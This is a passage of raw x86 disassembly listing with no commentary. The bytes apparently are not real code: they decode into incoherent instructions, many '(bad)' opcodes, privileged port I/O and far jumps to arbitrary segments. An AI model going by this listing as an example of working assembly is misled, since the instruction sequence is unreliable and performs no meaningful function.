  41044a:	add    DWORD PTR [edi+0x41],0xffffffa1
  41044e:	in     eax,dx
  41044f:	push   edi
  410450:	or     esi,DWORD PTR [ecx+esi*2+0x17]
  410454:	pop    edx
  410455:	sub    ebx,esp
  410457:	jbe    0x4103ec
  410459:	jb     0x4103f0
  41045b:	sub    BYTE PTR [ebp-0x3a],bl
  41045e:	inc    ecx
  41045f:	aad    0x26
  410461:	mov    ah,0x2d
  410463:	aam    0x79
  410465:	test   BYTE PTR ds:0xc420c338,bl
  41046b:	hlt    
  41046c:	bound  ecx,QWORD PTR [ebx+0x3a]
  41046f:	jmp    0x199c:0x95bf832e
  410476:	in     al,dx
  410477:	addr16 mov edi,0xe8550be0
  41047d:	xor    al,0x2f
  41047f:	add    eax,0x122d514d
  410484:	and    bl,BYTE PTR ds:0xf213634f
  41048a:	sbb    DWORD PTR [edi+ebx*2-0x142e8425],0x8c3de14c
  410495:	scas   eax,DWORD PTR es:[edi]
  410496:	xchg   ebx,eax
  410497:	push   0xc28e73cc
  41049c:	adc    al,0xca
  41049e:	add    DWORD PTR [ebx+0x4c3ebcc9],eax
  4104a4:	test   eax,0x67594239
  4104a9:	adc    eax,DWORD PTR [esi+0x64]
  4104ac:	imul   edx,DWORD PTR [eax],0xffffffce
  4104af:	xor    al,0x5f
  4104b1:	rcl    DWORD PTR [edx],1
  4104b3:	mov    eax,0x5ef14ea1
  4104b8:	popf   
  4104b9:	ret    0x3b3f
  4104bc:	lods   eax,DWORD PTR ds:[esi]
  4104bd:	fmul   st,st(2)
  4104bf:	add    al,BYTE PTR [ebx-0x180fc2cb]
  4104c5:	enter  0x70ba,0x1f
  4104c9:	repnz adc esp,ebp
  4104cc:	add    DWORD PTR [eax+0x5b8f1e0f],ecx
  4104d2:	(bad)  
  4104d3:	cmovne esi,DWORD PTR [ebp+0x30eaf955]
  4104da:	and    eax,0xb43d2d98
  4104df:	adc    edx,DWORD PTR [edx-0x10]
  4104e2:	jmp    0xd0832462
  4104e7:	pop    ebp
  4104e8:	lock imul edi,DWORD PTR [edx-0x5c],0x7f6b1628
  4104f0:	test   eax,0xae0eb103
  4104f5:	sub    al,BYTE PTR [edi]
  4104f7:	sbb    eax,0x837610b2
  4104fc:	sub    eax,0x10d9a94b
  410501:	imul   ecx,DWORD PTR [ebp-0x55],0x532b481b
  410508:	ins    DWORD PTR es:[edi],dx
  410509:	xor    edx,DWORD PTR [edi+eiz*2]
  41050c:	pop    esi
  41050d:	push   esp
  41050e:	ins    BYTE PTR es:[edi],dx
  41050f:	(bad)  
  410510:	popa   
  410511:	mov    edx,0x9f6dab59
  410516:	mov    ecx,0xa889f03
  41051b:	jno    0x4104c7
  41051d:	mov    BYTE PTR [ebx],0x1a
  410520:	fwait
  410521:	ja     0x4104d2
  410523:	ret    
  410524:	popf   
  410525:	jb     0x41051e
  410527:	inc    ecx
  410528:	push   es
  410529:	pop    es
  41052a:	int3   
  41052b:	icebp  
  41052c:	mov    ah,0x76
  41052e:	icebp  
  41052f:	and    eax,0x91e76e9a
  410534:	adc    DWORD PTR [edx],edx
  410536:	scas   al,BYTE PTR es:[edi]
  410537:	dec    esi
  410538:	arpl   WORD PTR ds:0x9f5713c0,sp
  41053e:	push   esi
  41053f:	mov    ds:0x87775de6,al
  410544:	jmp    0x9d22:0x5053b887
  41054b:	outs   dx,BYTE PTR es:[esi]
  41054d:	mov    dh,0x3c
  41054f:	or     dh,BYTE PTR [edi-0xcb49bb3]
  410555:	aad    0x18
  410557:	push   ebp
  410558:	mov    dl,0xd2
  41055a:	dec    edi
  41055b:	adc    bl,dl
  41055d:	pop    ss
  41055e:	add    ah,BYTE PTR [esp+ecx*1-0xa]
  410562:	inc    BYTE PTR [ebx+esi*1+0x41778e75]
  410569:	lods   eax,DWORD PTR ds:[esi]
  41056a:	iret   
  41056b:	aam    0xe9
  41056d:	sar    BYTE PTR [edi+0x3e],cl
  410570:	das    
  410571:	sub    bl,ch
  410573:	loopne 0x410505
  410575:	sbb    al,0x9d
  410577:	mov    al,0xa7
  410579:	arpl   WORD PTR [ebx],sp
  41057b:	das    
  41057c:	icebp  
  41057d:	dec    sp
  41057f:	(bad)
  410582:	ss ins DWORD PTR es:[edi],dx
  410584:	mov    dh,BYTE PTR [esi+0x639a0503]
  41058a:	sub    eax,0x15b8278b
  41058f:	add    ecx,DWORD PTR [eax-0x1f975d56]
  410595:	sbb    al,0x70
  410597:	push   es
  410598:	mov    esp,0x8525b3d2
  41059d:	pop    edi
  41059e:	mov    ebp,0xba634c95
  4105a3:	call   0x18b9:0xfb0875bd
  4105aa:	loope  0x4105e0
  4105ac:	or     ah,BYTE PTR [ecx+0x6c10fcda]
  4105b2:	dec    esi
  4105b3:	loopne 0x41061c
  4105b5:	and    al,0x84
  4105b7:	or     BYTE PTR [esi-0x4f],al
  4105ba:	dec    ebp
  4105bb:	inc    ecx
  4105bc:	mov    ebx,0x4fb6ee29
  4105c1:	mov    al,0xe1
  4105c3:	sub    BYTE PTR [edx+ebx*2-0xee49ed0],0x44
  4105cb:	pop    eax
  4105cc:	mov    DWORD PTR [eax],edx
  4105ce:	cmp    ah,ch
  4105d0:	lar    esi,WORD PTR [edx]
  4105d3:	div    DWORD PTR [eax+0x2c]
  4105d6:	sub    ah,bh
  4105d8:	xchg   edx,eax
  4105d9:	adc    BYTE PTR [edx+0x33],dh
  4105dc:	mov    dh,0x34
  4105de:	loop   0x4105ef
  4105e0:	xor    edi,edi
  4105e2:	or     DWORD PTR cs:[ecx+0x98c7838],0xffffffd3
  4105ea:	jmp    0x7829:0x2269a58c
  4105f1:	cwde   
  4105f2:	icebp  
  4105f3:	mov    ebx,0xcbcfb6c1
  4105f8:	das    
  4105f9:	pushf  
  4105fa:	scas   eax,DWORD PTR es:[edi]
  4105fb:	and    BYTE PTR [edi],bh
  4105fd:	outs   dx,DWORD PTR ds:[esi]
  4105fe:	inc    ecx
  4105ff:	retf   0xf87
  410602:	lods   eax,DWORD PTR ds:[esi]
  410603:	cld    
  410604:	into   
  410605:	sub    eax,0xa6b98529
  41060a:	jbe    0x410593
  41060c:	sub    bh,BYTE PTR [eax+0x6f7dc297]
  410612:	pop    esp
  410613:	or     bl,ch
  410615:	in     al,0xbf
  410617:	mov    ah,0xac
  410619:	jg     0x4105e1
  41061b:	cmp    eax,0xd0ffceed
  410620:	and    DWORD PTR [ecx-0x21d9e431],0xd973ad25
  41062a:	xor    BYTE PTR [ecx+0x2a],bl
  41062d:	aam    0xea
  41062f:	mov    ecx,0xa2921697
  410634:	loopne 0x41062f
  410636:	xchg   ecx,eax
  410637:	jno    0x4105b9
  410639:	jae    0x41067c
  41063b:	dec    ebx
  41063c:	js     0x410604
  41063e:	inc    edx
  41063f:	xchg   esi,esp
  410641:	add    al,0x6c
  410643:	mov    ah,al
  410645:	inc    DWORD PTR [ebx+edx*8-0x16]
  410649:	imul   esp,DWORD PTR [edi-0x48272cf],0x7042a02d
  410653:	hlt    
  410654:	dec    cl
  410656:	pusha  
  410657:	and    edi,DWORD PTR [ecx]
  410659:	adc    esi,eax
  41065b:	sti    
  41065c:	mov    edi,0xe9f83740
  410661:	xchg   ebp,eax
  410662:	cmc    
  410663:	ret    
  410664:	jmp    0x6293981f
  410669:	hlt    
  41066a:	xlat   BYTE PTR ds:[ebx]
  41066b:	fldenv [ebx+eax*2-0x26]
  41066f:	imul   ebx,DWORD PTR [ecx-0x7d],0xffffff9e
  410673:	sub    BYTE PTR [ebp+0x4f],al
  410676:	stos   BYTE PTR es:[edi],al
  410677:	add    eax,0xcbe0fded
  41067c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41067d:	ins    BYTE PTR es:[edi],dx
  41067e:	push   esp
  41067f:	ss push ebp
  410681:	clc    
  410682:	ss pop eax
  410684:	hlt    
  410685:	pop    ebp
  410686:	adc    eax,0x1489f383
  41068b:	dec    ecx
  41068c:	cs sub al,0x46
  41068f:	dec    eax
  410690:	rcl    DWORD PTR [eax],0xae
  410693:	test   ebx,edi
  410695:	pop    esi
  410696:	push   edi
  410697:	xchg   ecx,eax
  410698:	out    dx,al
  410699:	repz adc ch,BYTE PTR [edi-0x3b5131da]
  4106a0:	mov    edi,0x50bfc814
  4106a5:	dec    esi
  4106a6:	add    bl,BYTE PTR [ebp-0x673ae9db]
  4106ac:	push   edi
  4106ad:	cmp    DWORD PTR [eax],ebx
  4106af:	fidivr DWORD PTR [edx+0x25088d86]
  4106b5:	or     al,0xf6
  4106b7:	fsubr  DWORD PTR [ecx]
  4106b9:	shl    eax,cl
  4106bb:	and    DWORD PTR [ebp+edi*2-0x594f6c44],ecx
  4106c2:	cmp    cl,BYTE PTR [ebx-0x29]
  4106c5:	(bad)  
  4106c6:	and    eax,0x18014333
  4106cb:	dec    edi
  4106cc:	dec    esp
  4106cd:	call   0x58b96780
  4106d2:	test   DWORD PTR [ecx],edx
  4106d4:	aam    0x9b
  4106d6:	rol    DWORD PTR ds:0x74c8c2a4,1
  4106dc:	pop    ss
  4106dd:	sub    BYTE PTR [edx+esi*8-0x67481309],ah
  4106e4:	stos   DWORD PTR es:[edi],eax
  4106e5:	jl     0x41073e
  4106e7:	addr16 in eax,0xbf
  4106ea:	xchg   ecx,eax
  4106eb:	pop    es
  4106ec:	inc    edi
  4106ed:	push   eax
  4106ee:	(bad)  
  4106ef:	mov    dh,0x6a
  4106f1:	jle    0x4106e4
  4106f3:	push   cs
  4106f4:	dec    esi
  4106f5:	std    
  4106f6:	imul   ebx,DWORD PTR [ebx+0x372d7f66],0x4f
  4106fd:	mov    esp,0x20793b8f
  410702:	(bad)
  410706:	stos   DWORD PTR es:[di],eax
  410708:	mov    ecx,0xd5ab5060
  41070d:	push   ebx
  41070e:	mov    dl,0xf
  410710:	jl     0x410758
  410712:	ss add al,0xa6
  410715:	sbb    eax,0x2a3d27a4
  41071a:	xor    DWORD PTR [edx-0x67],ebp
  41071d:	addr16 sbb eax,0x7ff5b1d4
  410723:	pop    es
  410724:	xchg   DWORD PTR [ecx+0x58daa6dd],edx
  41072a:	pop    eax
  41072b:	call   0x4b204ddd
  410730:	(bad)  
  410731:	xor    eax,0x2a98de42
  410736:	arpl   di,si
  410738:	stos   DWORD PTR es:[edi],eax
  410739:	mov    edi,0xe6bfaa4
  41073e:	jle    0x4106d7
  410740:	mov    ebp,DWORD PTR ds:0xfa38a438
  410746:	inc    ebx
  410747:	jp     0x410707
  410749:	in     eax,dx
  41074a:	(bad)
  41074f:	enter  0x2215,0x8e
  410753:	cmp    BYTE PTR [edi-0x3a],cl
  410756:	mov    ebp,0x92c94359
  41075b:	xchg   ebp,eax
  41075c:	in     eax,0x32
  41075e:	test   DWORD PTR [ebp+0x2716bb3b],ebx
  410764:	jp     0x4107af
  410766:	dec    edx
  410767:	dec    esp
  410768:	ins    DWORD PTR es:[edi],dx
  410769:	cmc    
  41076a:	pop    esi
  41076b:	jl     0x410759
  41076d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41076e:	push   ebx
  41076f:	iret   
  410770:	pop    ecx
  410771:	or     BYTE PTR [ebx+0x150158e7],ah
  410777:	add    DWORD PTR [ebp+0x40f377cd],0x47
  41077e:	and    eax,DWORD PTR [edx-0x79b68945]
  410784:	shl    DWORD PTR gs:[edi-0x76],0xe7
  410789:	jp     0x4107de
  41078b:	test   al,0x65
  41078d:	sti    
  41078e:	dec    ebx
  41078f:	jle    0x410715
  410791:	sub    al,0x64
  410793:	jnp    0x410720
  410795:	fs out 0xb1,eax
  410798:	pop    ss
  410799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41079a:	adc    cl,BYTE PTR [edi+ecx*2-0x5a]
  41079e:	aad    0x3d
  4107a0:	mov    WORD PTR [ebx+edi*4],?
  4107a3:	dec    esi
  4107a4:	pop    eax
  4107a5:	mov    ch,0xfe
  4107a7:	mov    ds:0xc084b4c0,eax
  4107ac:	daa    
  4107ad:	adc    al,0xaa
  4107af:	mov    bh,0x42
  4107b1:	mov    ah,0x68
  4107b3:	fistp  QWORD PTR [edx]
  4107b5:	pusha  
  4107b6:	push   edx
  4107b7:	xchg   ecx,eax
  4107b8:	imul   eax,eax,0x28
  4107bb:	(bad)  
  4107bc:	push   ecx
  4107bd:	pop    ds
  4107be:	je     0x41075a
  4107c0:	aam    0xfc
  4107c2:	inc    edx
  4107c3:	stc    
  4107c4:	js     0x4107b5
  4107c6:	test   al,0xb2
  4107c8:	clc    
  4107c9:	jle    0x410810
  4107cb:	js     0x410788
  4107cd:	test   al,0x39
  4107cf:	ja     0x4107e1
  4107d1:	mov    BYTE PTR [edx+ecx*2-0x39],cl
  4107d5:	stos   BYTE PTR es:[edi],al
  4107d6:	lods   eax,DWORD PTR ds:[esi]
  4107d7:	push   ebx
  4107d8:	add    esp,DWORD PTR [esi-0x484bf863]
  4107de:	and    eax,0x4bb3290d
  4107e3:	push   0xcb5dc2c1
  4107e8:	fcom   DWORD PTR [edx-0x2de543b4]
  4107ee:	call   0xa864:0xf57d5863
  4107f5:	pop    es
  4107f6:	dec    esp
  4107f7:	xor    ecx,DWORD PTR [ebp-0x6a75a0c8]
  4107fd:	inc    eax
  4107fe:	lock shl al,cl
  410801:	aad    0xff
  410803:	lds    esp,FWORD PTR [edi]
  410805:	mov    esp,0xebba8bde
  41080a:	imul   DWORD PTR [ecx-0x583da4e4]
  410810:	mov    ds:0xbb619c14,eax
  410815:	xor    BYTE PTR [esi-0x78],bh
  410818:	mov    ah,0x38
  41081a:	pop    esi
  41081b:	enter  0xa732,0x84
  41081f:	pop    ss
  410820:	jecxz  0x4107de
  410822:	sti    
  410823:	ds aaa 
  410825:	retf   0xc033
  410828:	shl    edx,0x1e
  41082b:	mov    DWORD PTR [ebp+0x10],eax
  41082e:	jmp    0x410db8
  410833:	mov    DWORD PTR [edi],ebx
  410835:	adc    al,0xee
  410837:	sbb    ah,ah
  410839:	cmp    BYTE PTR [ecx],bl
  41083b:	jne    0x4107e5
  41083d:	es je  0x4107c8
  410840:	push   eax
  410841:	pop    ss
  410842:	je     0x4108b0
  410844:	push   esp
  410845:	push   ss
  410846:	push   ss
  410847:	cmp    eax,0xb161604
  41084c:	in     al,dx
  41084d:	inc    esp
  41084e:	in     al,0xcd
  410850:	les    ebp,FWORD PTR [edi]
  410852:	(bad)  
  410853:	pop    edx
  410854:	push   ds
  410855:	call   0x21eb:0xa5918a17
  41085c:	push   0x7f
  41085e:	addr16 jl 0x4108de
  410861:	jb     0x410870
  410863:	es sbb eax,0xfb59ad70
  410869:	outs   dx,DWORD PTR ds:[esi]
  41086a:	sbb    al,0x4f
  41086c:	fsubr  st,st(4)
  41086e:	cmp    al,0xb7
  410870:	aaa    
  410871:	aaa    
  410872:	ins    BYTE PTR es:[edi],dx
  410873:	daa    
  410874:	leave  
  410875:	int3   
  410876:	iret   
  410877:	pop    ds
  410878:	mov    ecx,DWORD PTR [ebp+0x718fc57e]
  41087e:	into   
  41087f:	mov    edx,0x9ee13aa2
  410884:	out    dx,eax
  410885:	out    0x82,eax
  410887:	sub    BYTE PTR [ebp-0x40],bh
  41088a:	jae    0x41086d
  41088c:	int3   
  41088d:	dec    esp
  41088e:	mov    edx,0x25530ba2
  410893:	or     cl,BYTE PTR [ebx-0x41531398]
  410899:	pop    edi
  41089a:	in     eax,dx
  41089b:	ret    
  41089c:	cmp    bh,dl
  41089e:	out    dx,eax
  41089f:	xor    eax,DWORD PTR [eax+0x32d572ba]
  4108a5:	xchg   edx,eax
  4108a6:	and    DWORD PTR [ebx+0x22],esp
  4108a9:	(bad)  
  4108aa:	nop
  4108ab:	inc    eax
  4108ac:	test   eax,0x1de90ebd
  4108b1:	je     0x41090a
  4108b3:	sahf   
  4108b4:	ss test eax,0x310416d5
  4108ba:	iret   
  4108bb:	mov    ebp,0x633ba084
  4108c0:	leave  
  4108c1:	xchg   DWORD PTR [edi],eax
  4108c3:	mov    ah,0x12
  4108c5:	cmp    eax,0x407e950f
  4108ca:	outs   dx,DWORD PTR ds:[esi]
  4108cb:	clc    
  4108cc:	icebp  
  4108cd:	in     al,dx
  4108ce:	mov    ecx,0xf15524d5
  4108d3:	or     esi,DWORD PTR [ecx]
  4108d5:	popa   
  4108d6:	lea    edx,[ebx-0x29]
  4108d9:	dec    ebp
  4108da:	unpckhps xmm0,xmm3
  4108dd:	out    dx,eax
  4108de:	and    ch,dl
  4108e0:	jbe    0x410941
  4108e2:	into   
  4108e3:	mov    dl,0x1c
  4108e5:	push   DWORD PTR [esi-0x1b]
  4108e8:	in     eax,dx
  4108e9:	je     0x41088b
  4108eb:	xor    edx,DWORD PTR [esi+0x4acab0fa]
  4108f1:	push   esi
  4108f2:	cwde   
  4108f3:	push   ecx
  4108f4:	data16 or BYTE PTR [ecx-0xe872f81],ah
  4108fb:	psllq  mm6,0x1b
  4108ff:	inc    esp
  410900:	jge    0x4108fb
  410902:	sub    al,0x58
  410904:	cmp    dh,BYTE PTR [edi]
  410906:	jg     0x41091e
  410908:	push   0x30cd3ab6
  41090d:	push   ss
  41090e:	popf   
  41090f:	mov    ecx,0xd6b6de30
  410914:	and    BYTE PTR [esi-0x7beac5e0],al
  41091a:	jmp    0x41090e
  41091c:	pop    ebx
  41091d:	(bad)  
  41091f:	xor    eax,DWORD PTR [ebp-0x21a45756]
  410925:	mov    dl,0xcd
  410927:	sbb    dl,ch
  410929:	or     eax,0xc972d281
  41092e:	or     BYTE PTR [edx+0x28],ch
  410931:	cli    
  410932:	mov    ebx,0x37f71667
  410937:	mov    bh,0x5f
  410939:	xlat   BYTE PTR ds:[ebx]
  41093a:	in     eax,0xc9
  41093c:	pop    edx
  41093d:	bound  ebx,QWORD PTR [ebp-0x67c87ef4]
  410943:	mov    ebx,0x63ae49e
  410948:	add    ebx,edx
  41094a:	addr16 push edi
  41094c:	pushw  es
  41094e:	fcomp  DWORD PTR [esi]
  410950:	sbb    al,0x78
  410952:	stos   BYTE PTR es:[edi],al
  410953:	add    DWORD PTR fs:[ebx-0x36fe93c0],eax
  41095a:	fidiv  DWORD PTR [edi+0x428395db]
  410960:	fnsave [esi+0x4f0aa5e4]
  410966:	mov    edi,0xf1b88df8
  41096b:	ret    0x6de
  41096e:	cwde   
  41096f:	sub    BYTE PTR [edi+ebx*4+0x5317039e],dh
  410976:	sub    eax,0x919b5126
  41097b:	cmc    
  41097c:	in     eax,0x8f
  41097e:	enter  0x4081,0x7b
  410982:	xchg   BYTE PTR [ecx],ch
  410984:	pop    edx
  410985:	pop    ebp
  410986:	ins    DWORD PTR es:[edi],dx
  410987:	or     al,0x67
  410989:	inc    eax
  41098a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41098b:	(bad)  
  41098c:	jns    0x4109fa
  41098e:	and    DWORD PTR [edx+0x60],ecx
  410991:	repz (bad) 
  410993:	cmc    
  410994:	stos   BYTE PTR es:[edi],al
  410995:	push   ss
  410996:	push   ds
  410997:	mov    WORD PTR [edx+0x4ee272be],cs
  41099d:	jl     0x410923
  41099f:	adc    eax,ebp
  4109a1:	les    edi,FWORD PTR [ecx]
  4109a3:	nop
  4109a4:	adc    ebx,DWORD PTR [ebx+0x54]
  4109a7:	adc    eax,0x406c03d3
  4109ac:	dec    eax
  4109ad:	out    0xf2,al
  4109af:	mov    bl,0xd6
  4109b1:	(bad)  
  4109b2:	xor    al,0x24
  4109b4:	stos   BYTE PTR es:[edi],al
  4109b5:	pushf  
  4109b6:	sub    al,0x4d
  4109b8:	jp     0x4109f3
  4109ba:	lock mov ds:0x7dc9ac9e,al
  4109c0:	xchg   esi,eax
  4109c1:	and    esi,DWORD PTR [edx-0xc]
  4109c4:	xor    esi,DWORD PTR [eax+0x26]
  4109c7:	ror    BYTE PTR cs:[edi+0x18],cl
  4109cb:	or     al,0xf9
  4109cd:	aas    
  4109ce:	pop    ebx
  4109cf:	(bad)  
  4109d0:	aam    0x58
  4109d2:	xchg   ecx,eax
  4109d3:	in     eax,0xb8
  4109d5:	add    eax,0x1f962a6c
  4109da:	dec    ecx
  4109db:	mov    ch,0x80
  4109dd:	inc    esp
  4109de:	xor    ebp,DWORD PTR [edx-0x5d]
  4109e1:	mov    cl,0x83
  4109e3:	sub    eax,0xa3fc015d
  4109e8:	sbb    al,0x9c
  4109ea:	pop    es
  4109eb:	pop    edi
  4109ec:	test   al,0x26
  4109ee:	cmp    ch,BYTE PTR [ebx]
  4109f0:	mov    eax,ds:0xd47de6c
  4109f5:	push   ecx
  4109f6:	cmp    dl,BYTE PTR [ebx*4+0xa50b51f]
  4109fd:	sbb    al,BYTE PTR [esp+ebp*1]
  410a00:	push   esp
  410a01:	cdq    
  410a02:	pop    esi
  410a03:	xor    DWORD PTR es:[ebp-0x3b],ebp
  410a07:	loope  0x4109c9
  410a09:	retf   
  410a0a:	cmp    dl,BYTE PTR [ecx+0x54]
  410a0d:	scas   al,BYTE PTR es:[edi]
  410a0e:	push   ebx
  410a0f:	xchg   edx,eax
  410a10:	fucomip st,st(6)
  410a12:	pop    ebp
  410a13:	dec    ecx
  410a14:	test   BYTE PTR [ebp+0x7ae49f1b],al
  410a1a:	adc    esp,DWORD PTR cs:[ebx]
  410a1d:	push   ss
  410a1e:	mov    eax,ds:0xe54f71eb
  410a23:	pop    eax
  410a24:	and    al,0xaf
  410a26:	outs   dx,DWORD PTR ds:[esi]
  410a27:	or     ebp,DWORD PTR fs:[esi-0x7970d778]
  410a2e:	cmp    bl,bh
  410a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a31:	sbb    DWORD PTR [esi-0x76],ebp
  410a34:	lods   al,BYTE PTR ds:[esi]
  410a35:	pop    eax
  410a36:	push   ss
  410a37:	mov    eax,0xcd1ba985
  410a3c:	push   0x49
  410a3e:	jp     0x410aa8
  410a40:	mov    dl,0x29
  410a42:	gs and ah,dh
  410a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a46:	fisttp QWORD PTR [ecx+ebp*8]
  410a49:	inc    ebx
  410a4a:	cwde   
  410a4b:	into   
  410a4c:	fdiv   QWORD PTR ds:0x3718c521
  410a52:	push   edx
  410a53:	mov    al,ds:0x6c1f43f9
  410a58:	out    dx,eax
  410a59:	xor    cl,BYTE PTR [ecx-0x2b7c35cd]
  410a5f:	int3   
  410a60:	cmp    al,BYTE PTR [ebx+0x78cc4007]
  410a66:	(bad)  
  410a67:	(bad)  
  410a68:	add    eax,DWORD PTR [ebx-0x647d0ddc]
  410a6e:	push   edx
  410a6f:	jmp    0x94e91f08
  410a74:	mov    ebp,0x202ef858
  410a79:	jo     0x410a26
  410a7b:	dec    ebx
  410a7c:	arpl   WORD PTR [ebx+ebx*8+0x6d9b631e],ax
  410a83:	imul   edx,DWORD PTR [edi+0x672f07fe],0x41
  410a8a:	push   cs
  410a8b:	jnp    0x410ad5
  410a8d:	jge    0x410a24
  410a8f:	mov    dh,0x23
  410a91:	xor    al,0xee
  410a93:	pop    esi
  410a94:	and    BYTE PTR [ebp-0x4c],cl
  410a97:	dec    ecx
  410a98:	out    dx,eax
  410a99:	mov    ds:0xf763ffaa,al
  410a9e:	mov    bh,0xc4
  410aa0:	or     esp,DWORD PTR fs:[esi+0x4f2252b0]
  410aa7:	adc    al,BYTE PTR [ecx+esi*1+0x4a]
  410aab:	xor    al,0x4c
  410aad:	jb     0x410a85
  410aaf:	xchg   dh,ah
  410ab1:	or     eax,0x662342aa
  410ab6:	xchg   esi,eax
  410ab7:	das    
  410ab8:	push   0xff96b067
  410abd:	mov    bh,0x5
  410abf:	jae    0x410ae4
  410ac1:	fist   DWORD PTR [edi-0x7263f176]
  410ac7:	fnstsw WORD PTR ds:0xdfad51d6
  410acd:	clc    
  410ace:	iret   
  410acf:	add    edx,0x35
  410ad2:	cmp    DWORD PTR [edx+0x24b6a670],0xfffffff3
  410ad9:	retf   
  410ada:	loope  0x410ad1
  410adc:	inc    edi
  410add:	mov    ds:0x3d27a696,al
  410ae2:	jbe    0x410aeb
  410ae4:	sbb    eax,DWORD PTR [esi+0x37]
  410ae7:	mov    ax,0x8292
  410aeb:	pop    ebx
  410aec:	mov    eax,0xc3b6bfc2
  410af1:	xor    edi,DWORD PTR [ecx-0x6a]
  410af4:	test   al,0xe1
  410af6:	dec    edi
  410af7:	ret    
  410af8:	jecxz  0x410b1a
  410afa:	aaa    
  410afb:	ss das 
  410afd:	mov    esi,0xbe53c5a
  410b02:	ja     0x410ae3
  410b04:	jmp    0x410aad
  410b06:	iret   
  410b07:	jnp    0x410b0c
  410b09:	push   ss
  410b0a:	cmp    dl,BYTE PTR [edx+edi*8+0x54]
  410b0e:	xor    BYTE PTR [ebp-0x2c0e02af],dh
  410b14:	shr    DWORD PTR [ebx],0x14
  410b17:	adc    eax,0x5383be08
  410b1c:	mov    ah,0xde
  410b1e:	clc    
  410b1f:	js     0x410b37
  410b21:	dec    ebx
  410b22:	mov    bh,0xb
  410b24:	retf   
  410b25:	mov    cl,0x7c
  410b27:	jmp    0x410b7b
  410b29:	(bad)  
  410b2a:	jp     0x410b51
  410b2c:	addr16 xchg ebp,eax
  410b2e:	xchg   ebp,eax
  410b2f:	jmp    0x374e:0xd8430b6e
  410b36:	and    BYTE PTR [ebx],al
  410b38:	std    
  410b39:	outs   dx,BYTE PTR ds:[esi]
  410b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b3b:	jmp    0x520bd4af
  410b40:	inc    esi
  410b41:	push   eax
  410b42:	loope  0x410b20
  410b44:	sub    eax,0xbe5502d2
  410b49:	mov    BYTE PTR [edx],dl
  410b4b:	std    
  410b4c:	fsub   QWORD PTR [esi]
  410b4e:	adc    BYTE PTR [ecx-0x2],dl
  410b51:	fcomp  DWORD PTR [esi+0x2b065c91]
  410b57:	mov    edi,0x19a1294d
  410b5c:	jmp    0x95ac:0xd67a94fe
  410b63:	push   0x34
  410b65:	stos   DWORD PTR es:[edi],eax
  410b66:	dec    edi
  410b67:	jno    0x410bae
  410b69:	stos   DWORD PTR es:[edi],eax
  410b6a:	hlt    
  410b6b:	mov    esp,0x336ec14d
  410b70:	shr    DWORD PTR [eax+eiz*4-0x75f8204d],0x5a
  410b78:	inc    ebx
  410b79:	test   BYTE PTR [edx-0x411a2628],dh
  410b7f:	(bad)  
  410b80:	frstor [ebp-0x5f]
  410b83:	leave  
  410b84:	das    
  410b85:	and    eax,0xdad78cc
  410b8a:	ins    BYTE PTR es:[edi],dx
  410b8b:	jge    0x410b8d
  410b8d:	mov    cl,0x5b
  410b8f:	es pop edi
  410b91:	inc    esi
  410b92:	mov    ah,0x73
  410b94:	mov    BYTE PTR [edx-0xb],ah
  410b97:	push   esp
  410b98:	pop    eax
  410b99:	xchg   esp,eax
  410b9a:	lea    edx,[eax]
  410b9c:	leave  
  410b9d:	push   cs
  410b9e:	mov    bh,0xa8
  410ba0:	push   ebp
  410ba1:	lods   al,BYTE PTR ds:[esi]
  410ba2:	mov    ch,0xe8
  410ba4:	sbb    DWORD PTR [ebx-0x6bf8346],0xffffffc4
  410bab:	dec    edi
  410bac:	adc    BYTE PTR gs:[ebx-0x30a88a3c],cl
  410bb3:	adc    ecx,ebx
  410bb5:	dec    esp
  410bb6:	cvtdq2ps xmm7,xmm4
  410bb9:	inc    ebx
  410bba:	add    eax,0xa0618cd3
  410bbf:	pop    ss
  410bc0:	push   ebx
  410bc1:	xchg   BYTE PTR [edi-0x18],dh
  410bc4:	mov    cl,0xaa
  410bc6:	sbb    al,0xf6
  410bc8:	retf   
  410bc9:	pushf  
  410bca:	shl    DWORD PTR [edx+0x6e],0xaa
  410bce:	mov    esi,0xd214e48a
  410bd3:	mov    esp,DWORD PTR [ecx-0x3acbb3f3]
  410bd9:	adc    BYTE PTR [edi],bl
  410bdb:	push   cs
  410bdc:	retf   
  410bdd:	and    eax,0xde59b477
  410be2:	or     al,0xf7
  410be4:	mov    bl,0x94
  410be6:	xchg   DWORD PTR [ecx],esp
  410be8:	ins    BYTE PTR es:[edi],dx
  410be9:	pop    eax
  410bea:	mov    cl,BYTE PTR [edx]
  410bec:	popa   
  410bed:	imul   ebx,ebp,0x5a71ca67
  410bf3:	fxch   st(1)
  410bf5:	dec    esp
  410bf6:	pop    ebx
  410bf7:	cmp    BYTE PTR [ebx],al
  410bf9:	fnstcw WORD PTR [ebp-0x56d4698d]
  410bff:	ret    0xf56e
  410c02:	sub    al,0x2c
  410c04:	aaa    
  410c05:	fdiv   DWORD PTR [edi]
  410c07:	push   0x86468e6c
  410c0c:	adc    BYTE PTR [ebx],al
  410c0e:	ror    BYTE PTR [edx],cl
  410c10:	popa   
  410c11:	test   DWORD PTR [esi-0x6],0x70bfca22
  410c18:	sbb    edi,DWORD PTR [eax+0xacca850]
  410c1e:	popa   
  410c1f:	push   ecx
  410c20:	jl     0x410bca
  410c22:	cmp    edx,DWORD PTR [ecx-0x6d]
  410c25:	sbb    al,bl
  410c27:	cmp    eax,0x65
  410c2a:	inc    edx
  410c2b:	shr    DWORD PTR [esi],1
  410c2d:	or     eax,0x2b851013
  410c32:	jb     0x410c0b
  410c34:	xor    al,0x1
  410c36:	cli    
  410c37:	pop    esi
  410c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c39:	dec    DWORD PTR [esi+ebx*8-0x33d52bfa]
  410c40:	pop    ebx
  410c41:	pop    edi
  410c42:	jne    0x410bf2
  410c44:	(bad)  
  410c45:	sbb    eax,0xc0c9cefd
  410c4a:	mov    edx,0x3a40f534
  410c4f:	aas    
  410c50:	(bad)  
  410c51:	retf   0xdea3
  410c54:	sub    edi,ebp
  410c56:	clc    
  410c57:	xchg   esi,eax
  410c58:	call   0x4e50:0x8a1652f3
